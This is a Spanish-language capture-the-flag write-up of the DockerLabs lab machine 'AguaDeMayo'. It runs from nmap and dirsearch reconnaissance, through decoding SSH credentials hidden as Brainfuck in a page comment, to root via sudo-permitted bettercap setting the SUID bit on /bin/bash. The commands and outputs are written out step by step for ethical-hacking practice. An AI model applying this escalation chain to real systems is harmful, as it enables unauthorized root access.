---
title: AguaDeMayo
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2024-12-1
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-aguademayo/aguademayo_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - fuzzing web
  - data leaks
  - sudo abuse
  - suid
  - ssh
  - http
  - tcp
  - information gathering
  - web analysis
  - data leak exploitation
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/aguademayo:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.047 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.047/0.047/0.047/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/aguademayo:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()	Status: Up
Host: 127.17.0.2 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/aguademayo:-$ sudo nmap -sCV -p22,80 -vvv -oN nmap2 127.17.0.2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 75:ec:4d:36:12:93:58:82:7b:62:e3:52:91:70:83:70 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMRaeMl5HzP0PMKd1yfAOHuPCmNExZI/4DB9HSC9ziglgySQKRqzfbEbqD00WXMvvvDpN/94jzGTgYk8w7TNN4Q=
|   256 8f:d8:0f:2c:4b:3e:2b:d7:3c:a2:83:d3:6d:3f:76:aa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOyI2THRG4Km6KNuoxG54FJksK4r+Dz2kw0+rBZcYhkC
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
## Web Analysis & Data Leak Exploitation

La página web inicial parece ser una plantilla predeterminada de Apache.

![](/assets/img/dockerlabs-writeup-aguademayo/aguademayo1.png)

Durante el proceso de fuzzing, encuentro un subdirectorio accesible

```terminal
/home/kali/Documents/dockerlabs/aguademayo:-$ dirsearch -u http://127.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[14:13:33] 301 -  309B  - /images  ->  http://127.17.0.2/images/
```

Dentro de este directorio, hay una imagen con un nombre sospechoso, 'agua_ssh'.

![](/assets/img/dockerlabs-writeup-aguademayo/aguademayo2.png)

Otro elemento sospechoso, son una serie de caracteres al final del código fuente de la página principal normalmente no deberían estar presentes en una plantilla de Apache.

```terminal
/home/kali/Documents/dockerlabs/aguademayo:-$ curl 127.17.0.2
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
	.
	.
	.
  </head>
  <body>
	.
	.
	.
  </body>
</html>

<!--
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
-->
```

Tras investigar, descubro que se trata de código escrito en un lenguaje llamado Brainfuck.

Si utilizo un decodificador para interpretar el código.

<https://www.dcode.fr/brainfuck-language>

El resultado es una cadena que parece ser una contraseña.

![](/assets/img/dockerlabs-writeup-aguademayo/aguademayo3.png)

Con estas credenciales 'agua:bebeaguaqueessano' puedo acceder al sistema vía SSH.

```terminal
/home/kali/Documents/dockerlabs/aguademayo:-$ ssh agua@127.17.0.2
agua@127.17.0.2's password: bebeaguaqueessano

agua@kali:~$ whoami
agua
```

---
## Privilege Escalation

Al iniciar sesión, verifico que el usuario actual pertenece al grupo 'lxd' y tiene un entorno de shell interactivo configurado.

```terminal
agua@kali:~$ id
uid=1000(agua) gid=1000(agua) groups=1000(agua),104(lxd)
```

El archivo '/etc/passwd' confirma que el usuario agua utiliza '/bin/bash' como shell por defecto.

```terminal
agua@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
agua:x:1000:1000::/home/agua:/bin/bash
```

El usuario 'agua' tiene permisos para ejecutar el binario '/usr/bin/bettercap' como 'root' sin necesidad de proporcionar una contraseña.

```terminal
agua@kali:~$ sudo -l
```

![](/assets/img/dockerlabs-writeup-aguademayo/aguademayo4.png)

Al ejecutar 'sudo /usr/bin/bettercap', se abre el prompt interactivo de la herramienta. Desde allí, con el comando 'help', se pueden listar las funciones y comandos disponibles.

Una funcionalidad destacada de este entorno es que permite ejecutar comandos del sistema utilizando el símbolo '!'.

```terminal
agua@kali:~$ sudo /usr/bin/bettercap
```

![](/assets/img/dockerlabs-writeup-aguademayo/aguademayo5.png)

![](/assets/img/dockerlabs-writeup-aguademayo/aguademayo6.png)

Aprovechando esta característica, asigno el bit SUID al binario '/bin/bash'

Esto modifica los permisos del binario bash, permitiendo que cualquier usuario que lo ejecute obtenga privilegios de 'root'.

```terminal
agua@kali:~$ /bin/bash -p
bash-5.2# id
uid=1000(agua) gid=1000(agua) euid=0(root) egid=0(root) groups=0(root),104(lxd),1000(agua)
```
